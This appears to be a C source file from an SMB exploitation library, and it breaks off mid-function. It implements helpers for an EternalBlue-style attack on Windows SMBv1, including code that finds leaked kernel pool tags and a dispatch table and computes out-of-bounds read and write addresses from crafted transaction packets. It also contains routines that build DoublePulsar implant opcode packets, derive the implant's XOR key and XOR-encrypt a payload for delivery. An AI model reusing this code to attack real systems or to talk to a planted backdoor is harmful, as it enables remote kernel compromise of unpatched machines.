#include "smb.h"
#pragma intrinsic(memset, memcpy)
#ifndef SMB_MACROS

#define SMB_COM_NEGOTIATE				0x72
#define SMB_COM_SESSION_SETUP_ANDX		0x73
#define SMB_COM_TREE_CONNECT			0x75
#define SMB_COM_TRANS					0x25
#define SMB_COM_TRANS_SECONDARY			0x26
#define SMB_COM_TRANS2					0x32
#define SMB_COM_TRANS2_SECONDARY
#define SMB_COM_NT_TRANS				0xa0
#define SMB_COM_NT_CREATE_ANDX			0xa2

#endif

#ifndef EXEC_ALLOC
#define EXEC_ALLOC
#endif // !EXEC_ALLOC




HMODULE __stdcall SmbLibraryInitialize(void)
{
#if(defined(_DEBUG) && defined(SMBLIB_USE_FULLPATH))
	const wchar_t name[] = TEXT("C:\\Users\\CyberSecurityExploitDevelopment\\Documents\\VisualStudioProjects\\SMBLibrary\\x64\\Release\\SMBLibrary.dll");
#else
	const wchar_t name[] = TEXT("SMBLibrary.dll");
#endif
	return ((GetModuleHandleW(name) == NULL) ? LoadLibraryW(name) : GetModuleHandleW(name));
}

#pragma warning(disable : 6387)

void __stdcall SmbLibraryRelease(void)
{
#if(defined(_DEBUG) && defined(SMBLIB_USE_FULLPATH))
	const wchar_t name[] = TEXT("C:\\Users\\Rhys\\Documents\\VisualStudioProjects\\SMBLibrary\\x64\\Release\\SMBLibrary.dll");
#else
	const wchar_t name[] = L"SMBLibrary.dll";
#endif
	//const wchar_t name[] = L"SMBLibrary.dll";
	if (notnull(GetModuleHandleW(name)))
		FreeLibrary(GetModuleHandleW(name));
	return;
}

BOOL __cdecl __memcmp(const void* a, const void* b, DWORD size)
{
	register PBYTE pa = MAKEPBYTE(a), pb = MAKEPBYTE(b);
	while (size--)
		if (*(pa++) != *(pb++))
			return FALSE;
	return TRUE;
}

BOOL find_memory_pattern(BUFFER IN* bws, PANYPOINTER IN OUT result, const void* IN pattern, DWORD IN patternsize)
{
	DWORD offset = 0;
	BOOL ret = FALSE;

	result->pvpointer = bws->pbdata;
	for (offset = 0; offset < (bws->dwsize - patternsize); offset++)
	{
		if (cmp(result->pbpointer + offset, pattern, patternsize))
		{
			ret = TRUE;
			result->address += offset;
			break;
		}
	}

	return ret;
}

VOID update_smb_info(smb_info* info, BUFFER* IN newpacket)
{
	DWORD* dwnetbios = (DWORD*)newpacket->pbdata, * dwtagfrag = NULL, * dwtagfree = NULL, * dwtaglstr = NULL;
	WORD* nbtsize = (WORD*)(newpacket->pbdata + 2);
	PSMB_HEADER smb = MAKEPSMB(newpacket->pbdata + sizeof(DWORD));
	PREQ_NT_CREATE_ANDX ntcreatereq = NULL;
	PRESP_NT_CREATE_ANDX ntcreateresp = NULL;
	PREQ_TREE_CONNECT_ANDX treeandxreq = NULL;
	PREQ_SESSIONSETUP_ANDX sessionsetupreq = NULL;
	ANYPOINTER ptr = { 0 };
	static BUFFER varbuf;


	if (!cmp(smb->Protocol, "\xFFSMB", sizeof(smb->Protocol)))
	{
		errmsg(__FUNCSIG__, __LINE__, STATUS_FAIL);
		return;
	}

	RtlZeroMemory(info->headerinfo, 32U);
	RtlCopyMemory(info->headerinfo, newpacket->pbdata + sizeof(DWORD), 32);

	ntcreatereq = (PREQ_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	ntcreateresp = (PRESP_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	treeandxreq = (PREQ_TREE_CONNECT_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	sessionsetupreq = (PREQ_SESSIONSETUP_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);

	RtlCopyMemory(&info->pid, &smb->Pid, 2);
	RtlCopyMemory(&info->uid, &smb->Uid, 2);
	RtlCopyMemory(&info->tid, &smb->Tid, 2);
	RtlCopyMemory(&info->mid, &smb->Mid, 2);

	bwsalloc(&varbuf, sizeof(DWORD) * 0x80);
	dwtagfrag = ((DWORD*)(varbuf.pbdata));
	dwtaglstr = dwtagfree = dwtagfrag;
	dwtagfree++;
	dwtaglstr = dwtagfree;
	dwtaglstr++;

	if (smb->Status.NtStatus & STATUS_FAIL)
		PutUlong(&info->srv_last_error, smb->Status.NtStatus);

	switch (smb->Command)
	{
	case SMB_COM_SESSION_SETUP_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = sessionsetupreq->andx.AndxCommand;
			info->AndxOffset = sessionsetupreq->andx.AndxOffset;
		}



	case SMB_COM_TREE_CONNECT:			//if command is SMB_COM_TREE_CONNECT and isnt a reply copy the unc path
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = treeandxreq->Andx.AndxCommand;
			info->AndxOffset = treeandxreq->Andx.AndxOffset;
			do
			{
				if (!find_memory_pattern(newpacket, &ptr, L"IPC$", sizeof(WCHAR) * 3))
					break;

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, L"\\\\", sizeof(WCHAR) * 2))
					break;

				InitUnicodeString(ptr.pwpointer, &info->tree_connection);

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, "?????", 5))
					break;

				InitString(ptr.ppointer, &info->tree_connect_andx_svc);
			} while (FALSE);
		}
		break;
	case SMB_COM_NT_CREATE_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))//request
		{
			info->AndxCommand = ntcreatereq->AndxCommand;
			info->AndxOffset = ntcreatereq->AndxOffset;
			break;
		}
		else//reply
		{
			info->AndxCommand = ntcreateresp->AndxCommand;
			RtlCopyMemory(&info->AndxOffset, &ntcreateresp->AndxOffset, sizeof(WORD));
			if (GetUshort(&ntcreateresp->Fid) & 0xFFFF)
				RtlCopyMemory(&info->fid, &ntcreateresp->Fid, sizeof(WORD));
			break;
		}

		//	*(&info->AndxCommand) = *(&ntcreatereq->AndxCommand);
		//	*(&info->AndxOffset) = *(&ntcreatereq->AndxOffset);
		//	if (info->fid & 0xFFFF)
		//		RtlCopyMemory(&info->fid, &ntcreateresp->Fid, 2);

	case SMB_COM_TRANS:
		*dwtagfrag = GetUlong("Frag");
		*dwtagfree = GetUlong("Free");
		*dwtaglstr = GetUlong("LStr");

		if (!(smb->Flags & SMB_FLAGS_REPLY))
			break;
		if (!find_memory_pattern(newpacket, &ptr, dwtagfrag, sizeof(DWORD)))
			*dwtagfrag = byteswap32(GetUlong("Frag"));

		if (!find_memory_pattern(newpacket, &ptr, "Frag", 4))
			if (!find_memory_pattern(newpacket, &ptr, "LStr", 4))
				break;
		if (find_memory_pattern(newpacket, &ptr, "Frag", 4))
			break;

	default:
		//RtlZeroMemory(&info->fid, 2);
		break;
	}
	bwsfree(&varbuf);
}

void csprng(PBYTE buffer, DWORD size)
{
	HCRYPTPROV hp = 0;
	if (!CryptAcquireContext(&hp, NULL, NULL, PROV_RSA_FULL, 0))
		errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	if (!CryptGenRandom(hp, size, buffer))
		errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	CryptReleaseContext(hp, 0);
}

unsigned int random(void)
{
	ULARGE_INTEGER out = { 0 };
	WORD wresult = 0;
	BYTE randbytes[0x10] = { 0 };
	ULARGE_INTEGER tickcnt = { 0 };

	csprng(randbytes, sizeof(randbytes));

	if (!GetUlongPtr(randbytes))
		return 0;

	RtlCopyMemory(&out, randbytes, sizeof(out));
	RtlZeroMemory(randbytes, sizeof(randbytes));

	tickcnt.QuadPart = GetTickCount64();

	if (tickcnt.QuadPart % 0x1000)
		PutUshort(&wresult, GetUshort(&out.HighPart));
	else if (!(tickcnt.QuadPart % 0x1000))
		PutUshort(&wresult, GetUshort(&out.LowPart));
	else
		PutUshort(&wresult, GetUshort(&out.QuadPart));

	return MAKEUNSIGNED(wresult);
}

//if the parameter passed contains the leak data
//this function will return the fe's offset from 
//begining of the buffer
DWORD __stdcall FindLeakedTrans2DispatchTable(BUFFER IN* bws)
{
	static ANYPOINTER base, any;
	static BYTE matchdata[0x10];
	static ULARGE_INTEGER offset;

	PutUlongPtr(&base, GetUlongPtr(&bws->pbdata));
	RtlFillMemory(matchdata, sizeof(matchdata), 0xFE);

	if (!find_memory_pattern(bws, &any, matchdata, sizeof(matchdata)))
		return 0;

	offset.QuadPart = (any.address - base.address);
	RtlZeroMemory(matchdata, sizeof(matchdata));

	return offset.LowPart;
}

DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
{
	DWORD status = 0;
	PSMB_HEADER smbresp = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET), smbreq = MAKEPSMB(request->pbdata + SMB_PARAM_OFFSET);
	PRESP_TRANSACTION2 trans2resp = (PRESP_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PREQ_TRANSACTION2 trans2req = (PREQ_TRANSACTION2)(request->pbdata + SMB_PARAM_OFFSET);

	status = (DWORD)(GetUshort(&smbresp->Mid) - GetUshort(&smbreq->Mid));
	status &= 0xFFUL;

	return status;
}

DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws)
{
	DWORD opcode = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUlong(&t, GetUlong(&trans2->Timeout));
	opcode = ((t)+(t >> 8) + (t >> 16) + (t >> 24));

	return (opcode & 0xFF);
}

BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode)
{
	DWORD op = 0, k = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = NULL;
	PSMB_HEADER smb = NULL;

	op = opcode;
	//PutUnsigned(&k, random());
	csprng(MAKEPBYTE(&k), sizeof(k));
	t = 0xFF & (op - ((k & 0xFFFF00) >> 16) - (0xFFFF & (k & 0xFF00) >> 8)) | k & 0xFFFF00;


	smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PutUlong(&trans2->Timeout, GetUlong(&t));

	if (!cmp(smb->Protocol, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}

DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws)
{
	ULONGLONG s = 0;
	ULARGE_INTEGER x = { 0 };
	PSMB_HEADER smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	s = byteswap64(GetUlonglong(smb->SecuritySignature));
	s = GetUlonglong(smb->SecuritySignature);

	x.QuadPart = (2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)));

	return (x.LowPart & 0xFFFFFFFF);
}

ULONG_PTR __stdcall GetOOBWriteAddress(BUFFER* IN packet)
{
	PREQ_TRANSACTION_SECONDARY transsecondary = NULL;
	PSMB_HEADER h = NULL;
	static WORD datacount, dataoffset, datadisplacement, paramcount, paramoffset;
	ANYPOINTER address_of_address = { 0 };

	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);
	transsecondary = (PREQ_TRANSACTION_SECONDARY)(packet->pbdata + SMB_PARAM_OFFSET);

	if (h->Command != SMB_COM_TRANS_SECONDARY)
		return NULL;

	PutUshort(&datacount, GetUshort(&transsecondary->DataCount));
	PutUshort(&dataoffset, GetUshort(&transsecondary->DataOffset));
	PutUshort(&paramcount, GetUshort(&transsecondary->ParameterCount));
	PutUshort(&paramoffset, GetUshort(&transsecondary->ParameterOffset));

	if (datacount < 8)
		return 0;

	address_of_address.pvpointer = (MAKEPBYTE(h) + GetUshort(&dataoffset));
	return GetUlongPtr(address_of_address.pbpointer);
}

#pragma warning(push)
#pragma warning(disable : 6385)
#pragma warning(disable : 6386)

ULONG_PTR** __stdcall GetAllOOBReadAddressesFromMultiRequest(BUFFER* IN packet, DWORD IN smbcount)
{
	BUFFER tmp = { 0 };
	ANYPOINTER addr = { NULL }, * racebaseaddr = (PANYPOINTER)(&packet->pbdata), * baseaddr = NULL;
	PSMB_HEADER* smbs = NULL;
	PREQ_TRANSACTION_SECONDARY* trans = NULL;
	ULONG_PTR** addresses = NULL;
	SIZE_T smbptrarraysize = (SIZE_T)(smbcount * sizeof(PSMB_HEADER)),
		transptrarraysize = (SIZE_T)(smbcount * sizeof(PREQ_TRANSACTION_SECONDARY));
	HANDLE heap = GetProcessHeap();
	DWORD i = 0;

	smbs = (SMB_HEADER**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, smbptrarraysize);
	trans = (REQ_TRANSACTION_SECONDARY**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, transptrarraysize);
	baseaddr = (PANYPOINTER)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(ANYPOINTER) * (SIZE_T)smbcount);

	if (isnull(smbs) || isnull(trans) || isnull(baseaddr))
		return NULL;

	RtlCopyMemory(&tmp, packet, sizeof(tmp));

	for (i = 0; i < smbcount; i++)
	{
		if (!find_memory_pattern(&tmp, baseaddr + i, "\xFFSMB", 4))
			break;
		RtlCopyMemory(&tmp, packet, sizeof(tmp));
		tmp.pbdata = (baseaddr[i].pbpointer + SMB_HEADER_OFFSET);
		tmp.dwsize -= (DWORD)(baseaddr[i].address - racebaseaddr->address);

		smbs[i] = MAKEPSMB(baseaddr[i].pbpointer);
	}

	RtlZeroMemory(&tmp, sizeof(tmp));

	for (i = 0; i < smbcount; i++)
	{
		baseaddr[i].address -= SMB_HEADER_OFFSET;
		trans[i] = (PREQ_TRANSACTION_SECONDARY)(baseaddr[i].pbpointer + SMB_PARAM_OFFSET);
	}

	RtlZeroMemory(baseaddr, sizeof(ANYPOINTER) * (SIZE_T)(smbcount));

	addresses = (ULONG_PTR**)HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, sizeof(ULONG_PTR) * (SIZE_T)(smbcount));

	if (isnull(addresses))
	{
		HeapFree(heap, 0, trans);
		HeapFree(heap, 0, smbs);
		HeapFree(heap, 0, baseaddr);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return NULL;
	}

	for (i = 0; i < smbcount; i++)
	{
		baseaddr[i].pvpointer = (MAKEPBYTE(smbs[i]) + trans[i]->DataOffset);
		addresses[i] = baseaddr[i].paddress;
	}

	HeapFree(heap, 0, trans);
	HeapFree(heap, 0, smbs);
	HeapFree(heap, 0, baseaddr);
	return addresses;
}

DWORD __stdcall FindLeakedDataFragTag(BUFFER IN* packet)
{
	static BUFFER tmp;
	static ANYPOINTER fragtag, * baseaddress;
	static ULONG_PTR offset, worawitoffset;
	PRESP_TRANSACTION trans = NULL;
	PSMB_HEADER h = NULL;

	if (isnull(packet) || isnull(packet->pbdata))
		return 0;

	baseaddress = (PANYPOINTER)(&packet->pbdata);

	RtlCopyMemory(&tmp, packet, sizeof(tmp));
	trans = (PRESP_TRANSACTION)(packet->pbdata + SMB_PARAM_OFFSET);
	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);

	//adjust pointer to point to trans data
	tmp.pbdata = (MAKEPBYTE(h) + trans->DataOffset);
	tmp.dwsize -= (DWORD)(GetUlongPtr(&tmp.pbdata) - baseaddress->address);

	if (!find_memory_pattern(&tmp, &fragtag, "Frag", 4))
		return 0;

	offset = (fragtag.address - baseaddress->address);
	worawitoffset = (fragtag.address - GetUlongPtr(&tmp.pbdata));

	return ((DWORD)(worawitoffset & 0xFFFFFFFFUL));
}

BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey)
{
	static BUFFER tmp;
	DWORD doublewordsize = 0, remainder = 0, * dwptr = NULL, i = 0;

	if (isnull(payload) || !GetUlong(&xorkey))
		return FALSE;

	if (payload->dwsize % 0x1000)
		return FALSE;

	doublewordsize = (payload->dwsize / sizeof(DWORD));
	dwptr = MAKEPDWORD(payload->pbdata);

	for (i = 0; i < doublewordsize; i++)
		dwptr[i] ^= xorkey;

	return TRUE;
}

void bwsalloc(BUFFER OUT* bws, DWORD IN size)
{
	SIZE_T siz = size;
	*bws = { 0 };
	bws->dwsize += size;
#ifdef EXEC_ALLOC
	bws->pbdata = MAKEPBYTE(VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
#else
	bws->pbdata = MAKEPBYTE(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, siz));
#endif // EXEC_ALLOC

	if (isnull(bws->pbdata))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError() | STATUS_NO_MEMORY);
		return;
	}

	RtlZeroMemory(bws->pbdata, siz);
	return;
}

void bwsfree(BUFFER IN* bws)
{
#ifdef EXEC_ALLOC
	if (notnull(bws->pbdata))
		if (!VirtualFree(bws->pbdata, 0, MEM_RELEASE))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#else
	if (notnull(bws->pbdata))
		if (!HeapFree(GetProcessHeap(), 0, bws->pbdata))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // EXEC_ALLOC
	RtlZeroMemory(bws, sizeof(BUFFER));
	return;
}

void __stdcall FreeRequestLinkedListBuffers(RequestPacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	void* (__cdecl * alloc)(size_t) = NULL;
	void(__cdecl * afree)(void*) = NULL;
	alloc = (&malloc);
	afree = (&free);

	DWORD i = 0, j = 0;

	for (PutUlong(&j, 0); j < GetUlong(ListElementCount); j++)
	{
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;

		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}

	return;
}

void __stdcall FreeResponseLinkedListBuffers(ResponsePacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD i = 0, j = 0;
	for (PutUlong(&i, 0); i < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;
		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeLeakdataLinkedListBuffers(LeakedDataLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD dw[0x2] = { 0 }, * ii = (&dw[0]), & i = dw[0];
	for (PutUlong(ii, 0); GetUlong(ii) < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->KrnlLeakResponse.pbdata))
			bwsfree(&liststart->KrnlLeakResponse);
		else
			continue;

		if (notnull(liststart->ResponseHeader))
			liststart->ResponseHeader = NULL;

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeRequestLinkedListSingleEntry(RequestPacketLinkedList* IN OUT entrypointer)
{
	do {
		if (isnull(entrypointer))
			break;

		if (isnull(entrypointer->ThisPacket.pbdata))
		{
			break;
		}
		else if (notnull(entrypointer->ThisPacket.pbdata))
		{
			bwsfree(&entrypointer->ThisPacket);
			entrypointer->ThisNetbiosSize = NULL,
				entrypointer->ThisSmb = NULL;
			break;
		}

	} while (FALSE);
	return;
}

void __stdcall FreeResponseLinkedListSingleEntry(ResponsePacketLinkedList* IN OUT entry)
{
	while ((1 | 2 | 4 | 8) % 2)
	{
		if (isnull(entry))
			break;
		if (notnull(entry->ThisNetbiosSize) && notnull(entry->ThisSmb))
		{
			entry->ThisNetbiosSize = NULL;
			entry->ThisSmb = NULL;
		}
		if (notnull(entry->ThisPacket.pbdata))
			bwsfree(&entry->ThisPacket);
		break;
	}
}



BOOL __stdcall AllocateAndSetupTransactionRequestList(TRANS_REQUEST_LIST** IN OUT liststart, DWORD numberofentries)
{
	SIZE_T size = (SIZE_T)(sizeof(TRANS_REQUEST_LIST) * numberofentries);
	PTRANS_REQUEST_LIST start = NULL, end = NULL, entry = NULL, next = NULL, previous = NULL;
	DWORD i = 0;
	if (isnull(liststart) || !GetUlong(&numberofentries))
		return FALSE;

	*liststart = (PTRANS_REQUEST_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(*liststart))
	{
		SetLastError(STATUS_NO_MEMORY);
		return FALSE;
	}

	start = *liststart;
	end = &start[numberofentries - 1];

	for (i = 0; i < numberofentries; i++)
	{
		entry = start + i;

		if (entry == start)
			previous = end;
		else
			previous = (&start[i - 1]);

		if (entry == end)
			next = start;
		else
			next = (&start[i + 1]);
		
		entry->Blink = previous;
		entry->Flink = next;

		PutUlong(&entry->dwsmbcommand, 0);
		PutUlong(&entry->transactionfunction, 0);
		PutUlongPtr(&entry->smb, 0);
		PutUlongPtr(&entry->transaction, 0);
	}
	return TRUE;
}

BOOL __stdcall FreeTransactionRequestList(TRANS_REQUEST_LIST** IN OUT liststart)
{
	return HeapFree(GetProcessHeap(), 0, *liststart);
}

BOOL __stdcall FillInTransactionRequestListEntry(TRANS_REQUEST_LIST* IN OUT translistentry, RequestPacketLinkedList* IN reqentry)
{
	if (isnull(translistentry) || isnull(reqentry))
		return FALSE;
	if (isnull(reqentry->ThisPacket.pbdata))
		return FALSE;
	if (isnull(reqentry->ThisSmb))
		return FALSE;
	
	if (
		(reqentry->ThisSmb->Command == SMB_COM_TRANS) ||
		(reqentry->ThisSmb->Command == SMB_COM_TRANS2) ||
		(reqentry->ThisSmb->Command == SMB_COM_TRANS_SECONDARY) ||
		(reqentry->ThisSmb->Command == SMB_COM_TRANS2_SECONDARY) ||
		(reqentry->ThisSmb->Command == SMB_COM_NT_TRANS))
	{
		translistentry->dwsmbcommand |= reqentry->ThisSmb->Command;
		translistentry->smb = reqentry->ThisSmb;
		translistentry->transaction.address = (GetUlongPtr(&reqentry->ThisPacket.pbdata) + SMB_PARAM_OFFSET);
		return TRUE;
	}
	else
	{
		return TRUE;
	}
	return FALSE;
}

BOOL __stdcall AllocateAndSetupTransactionResponseList(TRANS_RESPONSE_LIST** IN OUT liststart, DWORD numberofentries)
{
	SIZE_T size = (SIZE_T)(sizeof(TRANS_RESPONSE_LIST) * numberofentries);
	PTRANS_RESPONSE_LIST start = NULL, end = NULL, entry = NULL, next = NULL, previous = NULL;
	DWORD i = 0;
	
	if (isnull(liststart) || !GetUlong(&numberofentries))
		return FALSE;

	*liststart = (PTRANS_RESPONSE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(*liststart))
	{
		SetLastError(STATUS_NO_MEMORY);
		return FALSE;
	}

	start = *liststart;
	end = &start[numberofentries - 1];

	for (i = 0; i < numberofentries; i++)
	{
		entry = start + i;

		if (entry == start)
			previous = end;
		else
			previous = (&start[i - 1]);

		if (entry == end)
			next = start;
		else
			next = (&start[i + 1]);

		entry->Blink = previous;
		entry->Flink = next;

		PutUlong(&entry->dwsmbcommand, 0);
		PutUlong(&entry->transactionfunction, 0);
		PutUlongPtr(&entry->smb, 0);
		PutUlongPtr(&entry->transaction, 0);
	}
	return TRUE;
}

BOOL __stdcall FreeTransactionResponseList(TRANS_RESPONSE_LIST** IN OUT liststart)
{
	return HeapFree(GetProcessHeap(), 0, *liststart);
}

BOOL __stdcall FillInTransactionResponseListEntry(TRANS_RESPONSE_LIST* IN OUT translistentry, ResponsePacketLinkedList* IN respentry)
{
	if (isnull(translistentry) || isnull(respentry))
		return FALSE;
	if (isnull(respentry->ThisPacket.pbdata))
		return FALSE;
	if (isnull(respentry->ThisSmb))
		return FALSE;

	if (
		(respentry->ThisSmb->Command == SMB_COM_TRANS) ||
		(respentry->ThisSmb->Command == SMB_COM_TRANS2) ||
		(respentry->ThisSmb->Command == SMB_COM_TRANS_SECONDARY) ||
		(respentry->ThisSmb->Command == SMB_COM_TRANS2_SECONDARY) ||
		(respentry->ThisSmb->Command == SMB_COM_NT_TRANS))
	{
		translistentry->dwsmbcommand |= respentry->ThisSmb->Command;
		translistentry->smb = respentry->ThisSmb;
		translistentry->transaction.address = (GetUlongPtr(&respentry->ThisPacket.pbdata) + SMB_PARAM_OFFSET);
		return TRUE;
	}
	else
	{
		return TRUE;
	}
	return FALSE;

}

BOOL __stdcall AllocateSockets(SOCKET** IN OUT sockarraypointer, DWORD IN count)
{
	SIZE_T size = (((SIZE_T)(count)) * sizeof(SOCKET));

	if (isnull(sockarraypointer) || !GetUlong(&count))
		return FALSE;

	*sockarraypointer = (SOCKET*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(*sockarraypointer))
		return FALSE;
	else
		return TRUE;
}

BOOL __stdcall FreeSockets(SOCKET* IN sockarray)
{
	return HeapFree(GetProcessHeap(), 0, sockarray);
}


void __stdcall InitString(PCSTR IN cstr, STRING* IN OUT str)
{
	SIZE_T length = strlen(cstr), size = strlen(cstr) + sizeof(char);

	RtlZeroMemory(str, sizeof(STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
	return;
}

void __stdcall FreeString(STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(STRING));
}

void __stdcall InitUnicodeString(PCWSTR IN cstr, UNICODE_STRING* IN OUT str)
{
	SIZE_T length = wcslen(cstr) * 2, size = ((wcslen(cstr) * sizeof(wchar_t)) + sizeof(wchar_t));

	RtlZeroMemory(str, sizeof(UNICODE_STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
}

void __stdcall FreeUnicodeString(UNICODE_STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(UNICODE_STRING));
}

void __stdcall ConvertStringToUnicode(STRING* IN s, UNICODE_STRING* IN OUT u)
{
#pragma warning(push)
#pragma warning(disable : 6305)
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T alength = 0, wlength = 0, asize = 0, wsize = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000);

	alength += s->Length;
	asize += s->MaximumLength;

	wlength = (alength * sizeof(WCHAR));
	wsize = (alength + sizeof(WCHAR));

	wsprintfW(any->pwpointer, L"%S", s->Buffer);

	if (wlength != wcslen(MAKEPCWSTR(any->pwpointer)))
		wlength = wcslen(any->pwpointer);

	wsize = wlength + sizeof(WCHAR);

	InitUnicodeString(any->pwpointer, u);
	HeapFree(heap, 0, pv);
#pragma warning(pop)
}

void __stdcall ConvertUnicodeToString(UNICODE_STRING* IN u, STRING* IN OUT s)
{
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T wsize = 0, wlength = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000 / 2);

	wlength += u->Length;
	wsize += u->MaximumLength;

	wsprintfA(any->ppointer, "%S", u->Buffer);
	InitString(any->ppointer, s);

	HeapFree(heap, 0, pv);
}

void DumpHex(const void* vdata, DWORD size)
{
	register BYTE* data = (BYTE*)vdata;
	char ascii[17];
	DWORD i = 0, j = 0;

	ascii[16] = '\0';

	for (i = 0; i < size; i++)
	{
		fprintf_s(stdout, "%02X ", MAKEUNSIGNED(data[i]));
		if (((data[i]) >= ' ') && (data[i] <= '~'))
		{
			ascii[i % 16] = *(char*)(data + i);
		}
		else
		{
			ascii[i % 16] = '.';
		}

		if ((i + 1) % 8 == 0 || (i + 1) == size)
		{
			fprintf(stdout, " ");
			if ((i + 1) % 16 == 0)
			{
				fprintf(stdout, "|  %s \n", ascii);

			}
			else if ((i + 1) == size)
			{
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8)
				{
					fprintf(stdout, " ");
				}
				for (j = (i + 1) % 16; j < 16; ++j)
				{
					fprintf(stdout, "   ");
				}
				fprintf(stdout, "|  %s \n", ascii);
			}
		}
	}
}

WORD get_pid(smb_info* i)
{
	return GetUshort(&i->pid);
}

WORD get_uid(smb_info* i)
{
	return GetUshort(&i->uid);
}

WORD get_mid(smb_info* i)
{
	return GetUshort(&i->mid);
}

WORD get_tid(smb_info* i)
{
	return GetUshort(&i->tid);
}

WORD get_fid(smb_info* i)
{
	return GetUshort(&i->fid);
}

WORD get_special_mid(smb_info* i)
{
	return GetUshort(&i->special_mid);
}

WORD get_special_pid(smb_info* i)
{
